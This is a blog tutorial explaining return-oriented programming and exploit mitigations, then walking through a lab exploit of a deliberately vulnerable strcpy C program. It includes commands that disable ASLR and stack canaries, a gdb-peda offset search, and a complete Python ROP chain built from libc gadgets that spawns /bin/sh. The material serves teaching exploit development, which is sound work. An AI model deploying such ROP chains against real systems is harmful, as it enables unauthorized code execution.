---
layout: single
title:  "Wading through the maze of ROP chains"
date: 2021-06-19 11:04 +0200
tags:
  - ROP Chains
  - DEP
  - Stack Canaries
  - Return Oriented Programming
  - gdb
  - Buffer Overflow
categories:
  - Buffer Overflow
  - ROP Chain
---

<p align="center"><i>Birds Eye View and the Deep Dive Series</i></p>

# Birds Eye View
> ***The main idea of Return Oriented Programming (ROP) is to chain and run the instructions which are already present in the code to the attackers advantage.***

### Getting to know Buffer Overflows

In buffer overflow vulnerabilities, one of the most common methods used by attackers is to write the shellcode onto the stack and then to execute it. The execution of the shellcode is achieved by controlling the EIP, and pointing it to the start of the shellcode. The buffer overflow attacks have targeted both stack and heap memory regions for exploiting these vulnerabilities. 

> ***The key to successful buffer overflow attack is to control the Instruction Pointer (IP).***

In order to mitigate the effect of the buffer overflow vulnerabilities we have following mitigation's in place:

- ***Stack Canaries***: This is a compiler level protection. These are inserted by the compilers at compile time into the binaries. Different compilers have different ways by which they accomplish it.
- ***Data Execution Prevention (DEP)***: This is supported at the hardware level by way of `NX` bit. Setting or unsetting this bit will make the address space executable or non-executable. We can control it through software.
- ***Address Space Layout Randomization (ASLR)***: Here we randomize the address space of various segments of the program, so that they don’t have fixed address which can be easily exploited by the malicious actors. ASLR can be enabled or disable at the operation system level. In linux we have additional features to control it at program level also.

### Where do the ROPs fit in?
In Return Oriented Programming (ROP) we chain the gadgets in such a way that we are able to obtain the shell (command prompt) on the vulnerable system. It can be used to bypass the DEP/ASLR safeguards. 

### And what do you mean by gadgets?
Well, these are a group of instructions which end with `ret`. Some of the useful ROP gadgets are:

- Loading constant into register `pop eax; ret`
- Loading from memory `mov ebx, [eax]; ret`
- Store in memory `mov [eax], ebx; ret`
- Arithmetic operations `xor eax, eax; ret`
- System calls `int 0x80; ret`

# Deep Dive 
Having the background lets try to take a deep dive and understand what the hullabaloo is about. 

### Our objective is to launch `/bin/sh` shell

We will make use of following steps:
* Write `/bin/sh` string in memory
* Setup `execve` syscall number
* Setup `execve` arguments
* Syscall gadgets
* Find syscall interrupt
* Build the ROP chain as a python script

### Building the ROP Chain
* `int execve(const char *filename, char *const argv[], char *const
envp[]);`
    * `pop ebx` - first argument
    * `pop ecx` - second argument
    * `pop edx` - third argument
* `xor eax, eax`
    * used to initialize the context to zero
* `inc eax`
    * used 11 times to setup the execve syscall number
* `int 0x80`
    * syscall exception

### Example Exploitation
Let's take a vulnerable buffer overflow example code:
```
/*rop.c*/
#include <stdio.h>
#include <string.h>
int main(int argc,char *argv[]){
	char buf[10];
	strcpy(buf,argv[1]);
	printf("Buf:%s\n",buf);
	return 0;
}
```
### Compiling the above program
```
$ gcc -ggdb -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -znoexecstack
rop.c -o rop
```
* `-m32`: For output in 32 bit binary format.
* `ggdb`: Enable debug info.
* `mpreferred-stack-boundary`: GCC will align stack pointer on `2^2=4byte` boundary.
* `fno-stack-protector`: To disable stack canaries.
* `znoexecstack`: Enable `NX` to make stack non executable

### Disable ASLR
ASLR has following flags options
- `0`:  No Randomization
- `1`: Conservative Randomization
    - `Shared libraries`
    - `Stack`
    - `Mmap`
    - `VDSO`
    - `Heap`
- `2` Full Randomization
    - `Brk()`

For ease of understanding let us switch off the ASLR:
```
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
### Check the security attributes of binary using `gdb-peda`
```
$ gdb-peda -q ./rop
Reading symbols from ./rop...done.

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```
### Find the offset to `EIP`
Now, let's find the offset to the `EIP` in this program using `pattern_create` and `pattern_offset` commands:
```
gdb-peda$ pattern_create 50 patt.txt
gdb-peda$ r $(cat patt.txt)
Stopped reason: SIGSEGV
0x2d414143 in ?? ()
gdb-peda$ pattern_offset 0x2d414143
759251267 found at offset: 18
```
### Find gadgets and build the ROP chain
 We have to find the required gadgets from the `libc` library used by our program. In order to find the `libc` version, load the program in `gdb-peda` and put a breakpoint at `main()`:
```
gdb-peda$ b main
```
Run the program and use `vmmap` to see the modules loaded by the program

```
gdb-peda$ vmmap
Start      End        Perm	Name
0x56555000 0x56556000 r-xp	/home/cdac/prac-examples/rop
0x56556000 0x56557000 r--p	/home/cdac/prac-examples/rop
0x56557000 0x56558000 rw-p	/home/cdac/prac-examples/rop
0xf7ddd000 0xf7fb2000 r-xp	/lib/i386-linux-gnu/libc-2.27.so
0xf7fb2000 0xf7fb3000 ---p	/lib/i386-linux-gnu/libc-2.27.so
0xf7fb3000 0xf7fb5000 r--p	/lib/i386-linux-gnu/libc-2.27.so
0xf7fb5000 0xf7fb6000 rw-p	/lib/i386-linux-gnu/libc-2.27.so
0xf7fb6000 0xf7fb9000 rw-p	mapped
0xf7fcf000 0xf7fd1000 rw-p	mapped
...
```
Here, we can see the version of `libc` that is getting loaded at runtime. `/lib/i386-linux-gnu/libc-2.27.so` is getting loaded at the base address of `0xf7ddd000`. We will now use the following command to search for gadgets and create a chain using `ROPGadget` tool
```
$ ROPgadget --ropchain --binary /lib/i386-linux-gnu/libc-2.27.so > ./gadgets.txt
```
The gadgets found will be saved in `gadgets.txt` file. At the end of the file we can see that a `python2` code will be generated for ROP chain to call `/bin/sh`. Let us have a peep inside this file
```
Unique gadgets found: 118662

ROP chain generation
===========================================================
- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''
```

The addresses inside the ROP chain will be offsets inside the `libc.so` library. We have to add the base address that we have noted earlier. After adding the base address and the offset for the `EIP`, the python script will look as follows:
```python
#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Offset to EIP
p = 'A'*18
# Add the base address of the libc.so library
base = 0xf7ddd000

# Put the address of .data section will be moved into edx register
p += pack('<I', base + 0x00001aae) # pop edx ; ret
p += pack('<I', base + 0x001d8040) # @ .data

# Address of '/bin' string into eax register
p += pack('<I', base + 0x00024c1e) # pop eax ; ret
p += '/bin'

# Mov '/bin' string to start of .data section
p += pack('<I', base + 0x00075655) # mov dword ptr [edx], eax ; ret

# Mov '//sh' string to .data+4 section
p += pack('<I', base + 0x00001aae) # pop edx ; ret
p += pack('<I', base + 0x001d8044) # @ .data + 4
p += pack('<I', base + 0x00024c1e) # pop eax ; ret
p += '//sh'
p += pack('<I', base + 0x00075655) # mov dword ptr [edx], eax ; ret

# Now, we have to give two more arguments to the execve() function, which can be null
p += pack('<I', base + 0x00001aae) # pop edx ; ret
p += pack('<I', base + 0x001d8048) # @ .data + 8
p += pack('<I', base + 0x0002e565) # xor eax, eax ; ret
p += pack('<I', base + 0x00075655) # mov dword ptr [edx], eax ; ret

# First argument has to be in ebx
p += pack('<I', base + 0x00018c85) # pop ebx ; ret
p += pack('<I', base + 0x001d8040) # @ .data

# Second argument in ecx register which is null
p += pack('<I', base + 0x001926d5) # pop ecx ; ret
p += pack('<I', base + 0x001d8048) # @ .data + 8

# Third argument in edx register which is null
p += pack('<I', base + 0x00001aae) # pop edx ; ret
p += pack('<I', base + 0x001d8048) # @ .data + 8

# Now, we have to place 11 in eax which is number of execve() system call
p += pack('<I', base + 0x0002e565) # xor eax, eax ; ret
p += pack('<I', base + 0x00024bf8) # inc eax ; ret
p += pack('<I', base + 0x00024bf8) # inc eax ; ret
p += pack('<I', base + 0x00024bf8) # inc eax ; ret
p += pack('<I', base + 0x00024bf8) # inc eax ; ret
p += pack('<I', base + 0x00024bf8) # inc eax ; ret
p += pack('<I', base + 0x00024bf8) # inc eax ; ret
p += pack('<I', base + 0x00024bf8) # inc eax ; ret
p += pack('<I', base + 0x00024bf8) # inc eax ; ret
p += pack('<I', base + 0x00024bf8) # inc eax ; ret
p += pack('<I', base + 0x00024bf8) # inc eax ; ret
p += pack('<I', base + 0x00024bf8) # inc eax ; ret

# Syscall exception
p += pack('<I', base + 0x00002d37) # int 0x80

print p
```
To this code we have added the offset to EIP offset which is 18 bytes and also the base address of `libc` library. Here the `pack` library is used to automatically reverse the address as per little endian format requirements.

```
$ ./rop $(python rop-exploit.py)
Buf:AAAAAAAAAAAAAAAAAA����@P����
$ whoami
secure
$ id
uid=1000(secure) gid=1000(secure) groups=1000(secure)
```
Voila!! we have successfully executed the `/bin/sh` using ROP chain.
